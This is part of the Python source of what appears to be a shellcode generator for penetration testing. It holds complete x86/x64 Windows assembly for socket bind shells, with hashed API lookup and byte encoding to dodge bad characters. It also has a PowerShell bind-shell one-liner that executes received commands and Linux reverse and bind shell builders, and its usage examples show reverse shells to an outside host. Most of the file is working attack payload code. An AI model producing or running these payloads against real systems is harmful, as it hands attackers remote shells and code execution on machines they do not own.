    pop edi                       ; Save STARTUPINFOA pointer in EDI

    ; ===== Build command string "{shell}" =====
{shell_asm}    
    push esp                      ; Pointer to shell string
    pop ebx                       ; Save pointer to shell in EBX for later use
    
    ; ===== Allocate PROCESS_INFORMATION and call CreateProcessA =====
    mov eax, esp
    xor ecx, ecx
    mov cx, 0x390                 ; Allocate space for PROCESS_INFORMATION
    sub eax, ecx
    push eax                      ; lpProcessInformation
    push edi                      ; lpStartupInfo (STARTUPINFOA pointer)
    xor eax, eax
    push eax                      ; lpCurrentDirectory = NULL
    push eax                      ; lpEnvironment = NULL
    push eax                      ; dwCreationFlags = 0
    inc eax                       ; bInheritHandles = TRUE
    push eax
    dec eax                       ; NULL
    push eax                      ; lpThreadAttributes = NULL
    push eax                      ; lpProcessAttributes = NULL
    push ebx                      ; lpCommandLine = command pointer
    push eax                      ; lpApplicationName = NULL

    ; ===== Call CreateProcessA (pre-resolved) =====
    call dword ptr [ebp+0x18]     ; Call CreateProcessA from pre-resolve

    ; ===== Exit with TerminateProcess (pre-resolved) =====
    xor ecx, ecx
    push ecx                      ; uExitCode = 0
    push 0xFFFFFFFF               ; hProcess = -1 (current process)
    call dword ptr [ebp+0x14]     ; Call TerminateProcess from pre-resolve
"""
            }
        ],
        "exit": False  # We handle exit manually with TerminateProcess
    }


def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
    """
    Build a native Windows x64 socket bind shell.

    This creates a true socket-based bind shell using ws2_32.dll for x64 that:
    1. Pre-resolves CreateProcessA and TerminateProcess from kernel32
    2. Loads ws2_32.dll via LoadLibraryA
    3. Resolves WSAStartup, WSASocketA, bind, listen, and accept
    4. Calls WSAStartup to initialize Winsock
    5. Creates a socket via WSASocketA
    6. Binds to 0.0.0.0:port
    7. Listens for incoming connections
    8. Accepts a connection
    9. Redirects stdin/stdout/stderr to the accepted socket
    10. Executes shell with inherited handles

    Uses x64 fastcall convention (RCX, RDX, R8, R9, then stack) with shadow space.

    Args:
        port: Port to bind to
        bad_chars: Set of bad characters to avoid
        shell: Shell to execute (default: "cmd.exe")
               Examples: "cmd.exe", "powershell.exe", "C:\\Windows\\System32\\cmd.exe"

    Returns:
        dict: Configuration for WindowsGenerator with arch='x64'
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # Port in network byte order (swap bytes)
    port_word = ((port & 0xFF) << 8) | (port >> 8)

    # Build shell string storage instructions using NEG encoding for x64
    # We store the string in memory at [r15+0x180] using 8-byte chunks
    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate

    # Pad to multiple of 8 for x64
    while len(shell_bytes) % 8 != 0:
        shell_bytes = b'\x00' + shell_bytes

    # Generate mov instructions for shell string (reverse order for little-endian)
    shell_asm = "    mov rdx, r15                    ; RDX = base for shell string\n"
    shell_asm += "    add rdx, 0x180                  ; Offset for shell string storage\n"

    offset = 0
    for i in range(len(shell_bytes) - 8, -1, -8):
        chunk = shell_bytes[i:i+8]
        qword = int.from_bytes(chunk, byteorder='little')

        # Use NEG encoding: neg rax to get the value
        # For x64, we encode as: -encoded = qword => encoded = -qword
        encoded = (0x10000000000000000 - qword) & 0xFFFFFFFFFFFFFFFF

        shell_asm += f"    mov rax, 0x{encoded:016x}   ; Encoded value\n"
        shell_asm += f"    neg rax                       ; NEG to get 0x{qword:016x}\n"
        shell_asm += f"    mov [rdx+{offset:#x}], rax          ; Store shell string chunk\n"
        offset += 8

    return {
        "bad_chars": bad_chars,
        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
        "calls": [
            {
                "api": "TerminateProcess",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "CreateProcessA",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "_CUSTOM_BIND_SHELL_X64",
                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
                "args": [],
                "custom_asm": f"""
    ; ===== After boilerplate with pre_resolve, we have: =====
    ; [rbp+0x08] = lookup_func address
    ; [rbp+0x10] = LoadLibraryA (resolved by boilerplate)
    ; [rbp+0x14] = TerminateProcess (pre-resolved)
    ; [rbp+0x1c] = CreateProcessA (pre-resolved)
    ; [rbp+0x20] = kernel32/kernelbase base
    ; We'll use R15 as our workspace base pointer

    mov r15, rbp                    ; R15 = workspace base

    ; ===== Load ws2_32.dll string and call LoadLibraryA =====
    call_loadlibrarya:
    mov rcx, 0x642e32335f327377    ; "ws2_32.d"
    mov [r15+0x100], rcx
    mov rcx, 0x6c6c                 ; "ll"
    mov [r15+0x108], rcx
    lea rcx, [r15+0x100]            ; RCX = pointer to "ws2_32.dll"
    mov rax, [r15+0x10]             ; RAX = LoadLibraryA
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space
    mov rdi, rax                    ; RDI = ws2_32.dll base

    ; ===== Resolve WSAStartup =====
    locate_wsastartup:
    mov edx, 0x3bfcedcb             ; WSAStartup hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0x98], rax             ; Save WSAStartup

    ; ===== Resolve WSASocketA =====
    locate_wsasocketa:
    mov edx, 0xadf509d9             ; WSASocketA hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0xa0], rax             ; Save WSASocketA

    ; ===== Resolve bind =====
    locate_bind:
    mov edx, 0xc7701aa4             ; bind hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0xa8], rax             ; Save bind

    ; ===== Resolve listen =====
    locate_listen:
    mov edx, 0xe92eada4             ; listen hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0xb0], rax             ; Save listen

    ; ===== Resolve accept =====
    locate_accept:
    mov edx, 0xede03f7e             ; accept hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0xb8], rax             ; Save accept

    ; ===== Call WSAStartup(0x202, lpWSAData) =====
    call_wsastartup:
    mov rcx, 0x202                  ; RCX = wVersionRequested (2.2)
    lea rdx, [r15+0x200]            ; RDX = lpWSAData
    mov rax, [r15+0x98]             ; RAX = WSAStartup
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space

    ; ===== Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0) =====
    call_wsasocketa:
    mov ecx, 2                      ; RCX = AF_INET
    mov edx, 1                      ; RDX = SOCK_STREAM
    mov r8, 6                       ; R8 = IPPROTO_TCP
    xor r9, r9                      ; R9 = lpProtocolInfo = NULL
    sub rsp, 0x30                   ; Shadow space (0x20) + 2 stack args (0x10)
    mov qword ptr [rsp+0x20], r9    ; [rsp+0x20] = g = NULL
    mov qword ptr [rsp+0x28], r9    ; [rsp+0x28] = dwFlags = 0
    mov rax, [r15+0xa0]             ; RAX = WSASocketA
    call rax
    add rsp, 0x30                   ; Clean up
    mov r14, rax                    ; R14 = listen socket handle

    ; ===== Build sockaddr_in and call bind(socket, &sockaddr, sizeof) =====
    call_bind:
    mov rcx, rax                    ; RCX = socket
    mov r8, 0x10                    ; R8 = namelen = 16
    lea rdx, [r15+0x220]            ; RDX = name = &sockaddr_in

    ; Build sockaddr_in for bind: AF_INET (2) | port (2 bytes) | INADDR_ANY (0.0.0.0)
    xor r9, r9                      ; Clear R9
    mov r9w, 0x02                   ; sin_family = AF_INET
    shl r9, 16
    mov r9w, 0x{port_word:04x}      ; sin_port (network byte order)
    mov [rdx], r9                   ; Store AF_INET + port
    xor r9, r9
    mov [rdx+4], r9d                ; sin_addr = 0.0.0.0 (INADDR_ANY)
    mov [rdx+8], r9                 ; Zero out padding

    mov rax, [r15+0xa8]             ; RAX = bind
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space

    ; ===== Call listen(socket, backlog) =====
    call_listen:
    mov rcx, r14                    ; RCX = socket
    xor rdx, rdx                    ; RDX = backlog = 0 (default)
    mov rax, [r15+0xb0]             ; RAX = listen
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space

    ; ===== Call accept(socket, NULL, NULL) =====
    call_accept:
    mov rcx, r14                    ; RCX = socket
    xor rdx, rdx                    ; RDX = addr = NULL
    xor r8, r8                      ; R8 = addrlen = NULL
    mov rax, [r15+0xb8]             ; RAX = accept
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space
    mov rsi, rax                    ; RSI = accepted socket handle

    ; ===== Setup STARTUPINFOA and PROCESS_INFORMATION =====
    setup_si_and_pi:
    mov rdi, r15                    ; RDI = workspace base
    add rdi, 0x300                  ; RDI = lpProcessInformation and lpStartupInfo
    mov rbx, rdi                    ; RBX = lpStartupInfo
    xor eax, eax
    mov ecx, 0x20                   ; Zero 0x80 bytes (32 qwords)
    rep stosd                       ; Clear memory
    mov eax, 0x68                   ; EAX = sizeof(STARTUPINFOA) = 104 bytes
    mov [rbx], eax                  ; lpStartupInfo.cb
    mov eax, 0x100                  ; EAX = STARTF_USESTDHANDLES
    mov [rbx+0x3c], eax             ; lpStartupInfo.dwFlags
    mov [rbx+0x50], rsi             ; lpStartupInfo.hStdInput = accepted socket
    mov [rbx+0x58], rsi             ; lpStartupInfo.hStdOutput = accepted socket
    mov [rbx+0x60], rsi             ; lpStartupInfo.hStdError = accepted socket

    ; ===== Build command string "{shell}" =====
    call_createprocessa:
{shell_asm}
    xor ecx, ecx                    ; RCX = lpApplicationName = NULL
    lea rdx, [r15+0x180]            ; RDX = lpCommandLine (points to shell string)
    xor r8, r8                      ; R8 = lpProcessAttributes = NULL
    xor r9, r9                      ; R9 = lpThreadAttributes = NULL
    sub rsp, 0x50                   ; Shadow space + 6 stack args (0x20 + 0x30)
    xor eax, eax
    inc eax                         ; EAX = 1
    mov [rsp+0x20], rax             ; [rsp+0x20] = bInheritHandles = TRUE
    dec eax                         ; EAX = 0
    mov [rsp+0x28], rax             ; [rsp+0x28] = dwCreationFlags = 0
    mov [rsp+0x30], rax             ; [rsp+0x30] = lpEnvironment = NULL
    mov [rsp+0x38], rax             ; [rsp+0x38] = lpCurrentDirectory = NULL
    mov [rsp+0x40], rbx             ; [rsp+0x40] = lpStartupInfo
    add rbx, 0x68                   ; RBX = lpProcessInformation (past lpStartupInfo)
    mov [rsp+0x48], rbx             ; [rsp+0x48] = lpProcessInformation

    ; Call CreateProcessA (pre-resolved by boilerplate)
    mov rax, [r15+0x1c]             ; RAX = CreateProcessA (pre-resolved)
    call rax                        ; Call CreateProcessA
    add rsp, 0x50                   ; Clean up

    ; ===== Call TerminateProcess(-1, 0) to exit =====
    call_terminateprocess:
    xor rcx, rcx
    dec rcx                         ; RCX = -1 (current process)
    xor rdx, rdx                    ; RDX = exit code = 0

    ; Call TerminateProcess (pre-resolved by boilerplate)
    mov rax, [r15+0x14]             ; RAX = TerminateProcess (pre-resolved)
    sub rsp, 0x20                   ; Shadow space
    call rax                        ; Call TerminateProcess
    add rsp, 0x20                   ; Clean up shadow space
"""
            }
        ],
        "exit": False  # We handle exit manually with TerminateProcess
    }


def windows_bind_shell_simple(port, command="cmd.exe", bad_chars=None):
    """
    Build a simple Windows bind shell using standard API calls (JSON method).

    This is a simplified version that uses the standard API resolution approach
    rather than custom assembly. It executes a command via WinExec after setting
    up socket binding through a PowerShell one-liner or netcat-style approach.

    Note: This requires the target system to have the necessary utilities.
    For a pure socket-based bind shell with custom ASM, use windows_bind_shell().

    Args:
        port: Port to bind to
        command: Command to execute for bind shell (default: "cmd.exe")
                 Examples:
                 - "cmd.exe" (simple command prompt)
                 - PowerShell bind shell one-liner
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # PowerShell bind shell one-liner
    ps_bind = f'powershell -nop -c "$l=New-Object Net.Sockets.TcpListener({port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close();$l.Stop()"'

    return {
        "bad_chars": bad_chars,
        "calls": [
            {
                "api": "WinExec",
                "dll": "kernel32.dll",
                "args": [ps_bind if command == "cmd.exe" else command, 0]  # SW_HIDE
            }
        ],
        "exit": True
    }


def linux_execve(command="/bin/sh", arch="arm", bad_chars=None, shell=None):
    """
    Build a Linux execve payload.

    Args:
        command: Command to execute (or shell path if shell is None)
        arch: Architecture ("arm" or "arm64")
        bad_chars: Set of bad characters to avoid
        shell: Shell to execute (default: None, uses command parameter)
               Common options: "/bin/sh", "/bin/bash", "/bin/zsh"

    Returns:
        dict: Configuration for ARMLinuxGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # If shell is specified, use it instead of command
    exec_command = shell if shell else command

    return {
        "bad_chars": bad_chars,
        "payload": "execve",
        "command": exec_command,
        "arch": arch
    }


def linux_reverse_shell(host, port, arch="arm", bad_chars=None, shell="/bin/sh"):
    """
    Build a Linux reverse shell payload.

    Args:
        host: Target IP address
        port: Target port
        arch: Architecture ("arm" or "arm64")
        bad_chars: Set of bad characters to avoid
        shell: Shell to execute after connecting (default: "/bin/sh")
               Common options: "/bin/sh", "/bin/bash", "/bin/zsh"

    Returns:
        dict: Configuration for ARMLinuxGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    return {
        "bad_chars": bad_chars,
        "payload": "reverse_shell",
        "host": host,
        "port": port,
        "shell": shell,
        "arch": arch
    }


def linux_bind_shell(port, arch="arm", bad_chars=None, shell="/bin/sh"):
    """
    Build a Linux bind shell payload.

    This creates a socket-based bind shell that:
    1. Creates a socket
    2. Binds to 0.0.0.0:port
    3. Listens for incoming connections
    4. Accepts a connection
    5. Duplicates file descriptors (stdin/stdout/stderr) to the accepted socket
    6. Executes a shell

    Args:
        port: Port to bind to
        arch: Architecture ("arm" or "arm64")
        bad_chars: Set of bad characters to avoid
        shell: Shell to execute after accepting connection (default: "/bin/sh")
               Common options: "/bin/sh", "/bin/bash", "/bin/zsh"

    Returns:
        dict: Configuration for ARMLinuxGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    return {
        "bad_chars": bad_chars,
        "payload": "bind_shell",
        "port": port,
        "shell": shell,
        "arch": arch
    }


# Payload registry for CLI discovery with descriptions and architecture support
# Format: "name": (function, description, [supported_architectures])
PAYLOADS = {
    "windows": {
        "messagebox": (windows_messagebox, "Display MessageBox dialog", ["x86", "x64"]),
        "winexec": (windows_winexec, "Execute commands via WinExec", ["x86", "x64"]),
        "createprocess": (windows_createprocess, "Execute via CreateProcessA (flexible process creation)", ["x86", "x64"]),
        "shellexecute": (windows_shellexecute, "Execute via ShellExecuteA (programs/URLs with verbs)", ["x86", "x64"]),
        "system": (windows_system, "Execute via system() from msvcrt.dll (C runtime)", ["x86", "x64"]),
        "download_exec": (windows_download_exec, "Download file (URLDownloadToFile) and execute", ["x86", "x64"]),
        "reverse_shell": (windows_reverse_shell, "Native socket reverse shell (runs in current process)", ["x86"]),
        "reverse_shell_x64": (windows_reverse_shell_x64, "Native socket reverse shell", ["x64"]),
        "reverse_shell_powershell": (windows_reverse_shell_powershell, "PowerShell reverse shell (spawns child process)", ["x86", "x64"]),
        "bind_shell": (windows_bind_shell, "Native socket bind shell (listens for connections)", ["x86"]),
        "bind_shell_x64": (windows_bind_shell_x64, "Native socket bind shell", ["x64"]),
        "bind_shell_simple": (windows_bind_shell_simple, "PowerShell bind shell (simple, spawns child process)", ["x86", "x64"]),
    },
    "linux": {
        "execve": (linux_execve, "Execute commands via execve syscall", ["arm", "arm64", "x86", "x64"]),
        "reverse_shell": (linux_reverse_shell, "TCP reverse shell (socket + execve)", ["arm", "arm64", "x86", "x64"]),
        "bind_shell": (linux_bind_shell, "TCP bind shell (listens + execve)", ["arm", "arm64", "x86", "x64"]),
    }
}


def list_payloads():
    """Display a formatted, colorized list of all available payloads with architecture support."""
    # Print header
    printer.print_section("\n" + "="*70, "bold green")
    printer.print_section("  Shellcode Generator - Available Payloads", "bold green")
    printer.print_section("="*70 + "\n", "bold green")

    # Windows payloads with architecture display
    printer.print_section("Windows Payloads:", "bold cyan")
    for name, (func, description, archs) in PAYLOADS["windows"].items():
        printer.print_text(f"  • ", "yellow", end="")
        printer.print_text(f"{name:28s}", "bold white", end="")

        # Display supported architectures
        arch_str = ", ".join(archs)
        printer.print_text(f"[{arch_str:12s}]", "dim cyan", end="")
        printer.print_text(f" - {description}", "dim white")

    print()  # Blank line

    # Linux payloads with architecture display
    printer.print_section("Linux Payloads:", "bold cyan")
    for name, (func, description, archs) in PAYLOADS["linux"].items():
        printer.print_text(f"  • ", "yellow", end="")
        printer.print_text(f"{name:28s}", "bold white", end="")

        # Display supported architectures
        arch_str = ", ".join(archs)
        printer.print_text(f"[{arch_str:20s}]", "dim cyan", end="")
        printer.print_text(f" - {description}", "dim white")

    print()  # Blank line

    # Architecture compatibility matrix
    printer.print_section("\nArchitecture Compatibility Matrix:", "bold green")
    print()  # Spacing

    # Build matrix for Windows payloads
    win_rows = []
    for name, (func, description, archs) in PAYLOADS["windows"].items():
        row = [name]
        row.append("✓" if "x86" in archs else "✗")
        row.append("✓" if "x64" in archs else "✗")
        win_rows.append(row)

    printer.print_table(
        columns=["Windows Payload", "x86", "x64"],
        rows=win_rows,
        title="Windows Architecture Support"
    )

    # Build matrix for Linux payloads
    linux_rows = []
    for name, (func, description, archs) in PAYLOADS["linux"].items():
        row = [name]
        row.append("✓" if "x86" in archs else "✗")
        row.append("✓" if "x64" in archs else "✗")
        row.append("✓" if "arm" in archs else "✗")
        row.append("✓" if "arm64" in archs else "✗")
        linux_rows.append(row)

    printer.print_table(
        columns=["Linux Payload", "x86", "x64", "ARM", "ARM64"],
        rows=linux_rows,
        title="Linux Architecture Support"
    )

    # Example usage
    printer.print_section("\nExamples:", "bold green")
    print()

    printer.print_text("  Windows MessageBox (x86):", "bold yellow")
    printer.print_text("    ./shellgen.sh --platform windows --payload messagebox \\", "cyan")
    printer.print_text("                  --title \"Test\" --message \"Hello World\" --arch x86", "cyan")

    print()
    printer.print_text("  Windows Reverse Shell (x64):", "bold yellow")
    printer.print_text("    ./shellgen.sh --platform windows --payload reverse_shell_x64 \\", "cyan")
    printer.print_text("                  --host 10.10.14.5 --port 443 --arch x64", "cyan")

    print()
    printer.print_text("  Linux Reverse Shell (ARM64):", "bold yellow")
    printer.print_text("    ./shellgen.sh --platform linux --payload reverse_shell \\", "cyan")
    printer.print_text("                  --host 10.10.14.5 --port 443 --arch arm64", "cyan")

    print()
    printer.print_text("  Python Format Output:", "bold yellow")
    printer.print_text("    ./shellgen.sh --platform linux --payload execve \\", "cyan")
    printer.print_text("                  --cmd \"whoami\" --arch arm64 --format python", "cyan")

    print()  # Blank line

    # Usage hint
    printer.print_section("Usage:", "bold green")
    printer.print_text("  shellgen_cli.py --platform <platform> --payload <name> [options]", "cyan")
    printer.print_text("  shellgen_cli.py --help", "cyan")

    # Add helpful tip
    print()
    tip = "💡 TIP: Use --arch to specify target architecture (x86, x64, arm, arm64)\n         Use --format to choose output format (asm, python, c, raw, pyasm)\n         Use --bad-chars to avoid specific bytes (e.g., --bad-chars 00,0a,0d)"
    printer.print_panel(tip, title="Quick Tips", style="cyan", border_style="cyan")

    return ""  # Return empty string for backward compatibility


def get_payload_builder(platform, payload_name):
    """
    Get a payload builder function by platform and name.

    Args:
        platform: "windows" or "linux"
        payload_name: Name of the payload

    Returns:
        Callable: Payload builder function

    Raises:
        ValueError: If platform or payload not found
    """
    if platform not in PAYLOADS:
        raise ValueError(f"Unknown platform: {platform}. Use 'windows' or 'linux'")

    if payload_name not in PAYLOADS[platform]:
        raise ValueError(f"Unknown payload '{payload_name}' for platform '{platform}'")

    # Return just the function (first element of tuple: function, description, archs)
    return PAYLOADS[platform][payload_name][0]
